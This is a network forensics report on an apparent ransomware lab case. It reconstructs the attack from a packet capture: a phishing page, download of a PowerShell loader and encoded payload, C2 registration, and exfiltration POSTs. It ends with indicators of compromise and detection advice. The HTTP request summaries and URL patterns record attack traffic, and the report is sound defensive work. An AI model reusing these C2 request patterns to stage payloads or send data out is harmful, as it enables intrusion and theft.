# Network Forensics Analysis

**Case:** RANSOMWARE_21a34484  
**Evidence:** attack_full.pcap (19MB, 4,634 packets)  
**Analyst:** Jesse Antman  

---

## Executive Summary

Comprehensive network traffic analysis revealed the complete attack chain from initial phishing page access to data exfiltration. All C2 communication occurred over unencrypted HTTP, making detection and analysis straightforward.

**Key Finding:** The entire attack from payload download to exfiltration took only 90 seconds.

---

## Timeline

| Timestamp | Event | Details |
|-----------|-------|---------|
| 07:49:37.665 | Initial Access | User accessed phishing page |
| 07:50:51.257 | Payload Stage 1 | Downloaded loader.ps1 (868 bytes) |
| 07:50:51.337 | Payload Stage 2 | Downloaded config.dat (18.6MB) |
| 07:50:56.233 | C2 Registration | Sent system info + encryption key |
| 07:51:06.304 | Exfiltration | Sent list of 37 encrypted files |

---

## Traffic Analysis

### C2 Communication (192.168.74.157 ↔ 192.168.74.147)
```
Packets:  2,920 (63% of total)
Data:     18 MB (95% of total)
Duration: 88.7 seconds
Protocol: HTTP (unencrypted)
```

### HTTP Requests

**1. Phishing Page**
```http
GET / HTTP/1.1
Host: 192.168.74.147:8080
→ Response: 200 OK (13,430 bytes)
```

**2. PowerShell Loader**
```http
GET /loader.ps1 HTTP/1.1
→ Response: 200 OK (868 bytes)
```

**3. Encoded Payload**
```http
GET /config.dat HTTP/1.1
→ Response: 200 OK (18,595,556 bytes)
```

**4. C2 Registration**
```http
POST /register HTTP/1.1
Content-Type: application/json

{
  "victim_id": "21a34484",
  "encryption_key": "9Wf1-APAw9C2sLDinvPOJGvWEop9a5C3d4nP8OAa7qw=",
  ...
}
→ Response: 200 OK
```

**5. Data Exfiltration**
```http
POST /exfiltrate HTTP/1.1
Content-Type: application/json

{
  "victim_id": "21a34484",
  "count": 37,
  "encrypted_files": [...]
}
→ Response: 200 OK
```

---

## IOCs

### Network Indicators

- **C2 IP:** 192.168.74.147
- **C2 Port:** 8080
- **Protocol:** HTTP (no encryption)
- **User-Agent:** Mozilla/5.0 (Windows NT 10.0; Win64; x64)

### URL Patterns

- `http://[IP]:8080/loader.ps1`
- `http://[IP]:8080/config.dat`
- `http://[IP]:8080/register`
- `http://[IP]:8080/exfiltrate`

---

## Detection Recommendations

1. **IDS/IPS Rules** for C2 communication patterns
2. **Firewall blocks** for connections to port 8080
3. **DLP** to detect large JSON payloads with "encryption_key"
4. **Proxy filtering** for .ps1 and .dat downloads

[Full details in analysis/network/]

